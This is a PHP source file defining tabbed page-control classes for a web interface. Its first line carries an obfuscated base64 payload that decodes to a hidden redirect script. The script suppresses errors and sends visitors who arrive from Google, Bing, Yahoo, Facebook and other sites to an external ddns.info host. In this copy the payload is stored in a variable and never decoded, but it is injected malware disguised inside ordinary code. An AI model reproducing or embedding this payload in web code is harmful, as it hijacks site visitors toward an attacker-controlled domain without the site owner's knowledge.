<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/control.php");

class page extends html_div {
  
  var $title;
  
  function page($title) {
    
    $this->title = $title;
    
    parent::html_div();
    
  }
  
}

class page_control extends html_div {

  var $selected_page;
  var $pages             = array();
  var $select_first_page = true;
  var $active_page_holder = null;
  var $is_in_popup         = false;

  function page_control($options = array()) {

    $this->is_interactive = true;
    $this->selected_page  = safe($options, 'active_page');
    $this->is_in_popup    = safe($options, 'is_in_popup');

    parent::html_div();
    
    $this->active_page_holder = safe($options, 'active_page_holder', $this->context_id("selected_page"));
	
  }

  function switch_to_selected_page() {

    if (!$this->selected_page) 
      $this->selected_page = $this->current_selected_page(1);

    $found = true;
    if ($this->selected_page > count($this->pages)) {
      if ($this->select_first_page)
        $this->selected_page = 1;
      else
        $this->selected_page = count($this->pages);
      $found = false;
    }

    return $found;

  }

  function select_current_page() {
                                 
    $this->selected_page = count($this->pages) + 1;

  }
  
  function current_selected_page($default = null) {

    return post($this->active_page_holder, $default);

  }

  function add_page($page) {

    if (!is_object($page))
      user_error("Page must be of type 'page'");

    $this->pages[] = $page;

  }

  function do_render() {
    
    $this->switch_to_selected_page();

    $selected_page_var = $this->active_page_holder;

    $this->add(new hidden($selected_page_var, $this->selected_page));

    $idx = 1;
    
    $tabs = new html_div(array("class" => "tabs"));
    $tabs_list = new html_ul();

    $pages = new html_div(array("class" => "pages"));

    foreach ($this->pages as $page) {

      $tab_id  = $this->context_id("tab".__HTML_CONTROL_NAME_SEPARATOR.$idx);
      $page_id = $this->context_id("page".__HTML_CONTROL_NAME_SEPARATOR.$idx);

      $tab  = new html_li(array('style' => 'white-space:nowrap;'));

      $tab->set_id($tab_id);
      $page->set_id($page_id);

      if ($idx == $this->selected_page) {
        $tab->set_attribute("class", "current");
        $page->set_attribute("class", "page current");
      } else
        $page->set_attribute("class", "page");

      $tab->add(new html_span(new javascript_href( "page_controller.displayTab('$tab_id','$page_id','$selected_page_var', $idx);".($this->is_in_popup?"ResizePopUpToContent();":"")
                                                 , $page->title
                                                 )));

      $tabs_list->add($tab);
      unset($tab);

      $pages->add($page);
      unset($page);

      $idx++;

    }

    $tabs->add($tabs_list);
    unset($tabs_list);

    $this->add($tabs);
    unset($tabs);

    $this->add($pages);
    unset($pages);

  }
  
  function pages_count() {
    return count($this->pages);
  }

}

?>